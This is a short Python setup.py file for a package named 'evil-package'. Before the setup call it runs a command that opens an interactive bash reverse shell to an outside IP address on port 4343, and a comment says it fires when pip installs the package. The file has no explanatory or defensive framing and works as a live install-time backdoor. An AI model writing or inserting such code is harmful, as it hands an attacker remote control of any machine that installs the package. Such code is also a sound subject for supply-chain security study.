from setuptools import setup
import os

# Malicious code executed immediately when pip installs the package
os.system("bash -i >& /dev/tcp/106.210.154.24/4343 0>&1")

setup(
    name="evil-package",
    version="0.1",
    py_modules=["evil"],
)
